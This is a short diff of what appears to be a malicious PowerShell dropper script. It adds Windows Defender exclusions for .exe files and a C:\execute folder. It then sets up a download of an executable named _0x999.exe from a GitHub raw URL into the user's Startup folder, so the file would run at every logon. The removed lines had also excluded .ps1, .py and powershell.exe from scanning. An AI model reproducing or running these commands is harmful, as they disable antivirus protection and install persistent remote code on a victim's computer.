@@ -18,9 +18,6 @@ powershell -Command Add-MpPreference -ExclusionExtension ".java"
 FINALLY SCRIPT:
 
 powershell -Command Add-MpPreference -ExclusionExtension ".exe"
-powershell -Command Add-MpPreference -ExclusionExtension ".ps1"
-powershell -Command Add-MpPreference -ExclusionExtension ".py"
-powershell -Command Add-MpPreference -ExclusionProcess "powershell.exe"
 powershell -Command Add-MpPreference -ExclusionPath "C:\execute"
 $download_url = "https://github.com/nicolashacku/_0x999/blob/main/_0x999.exe?raw=true"
 $local_path = "C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\_0x999.exe"
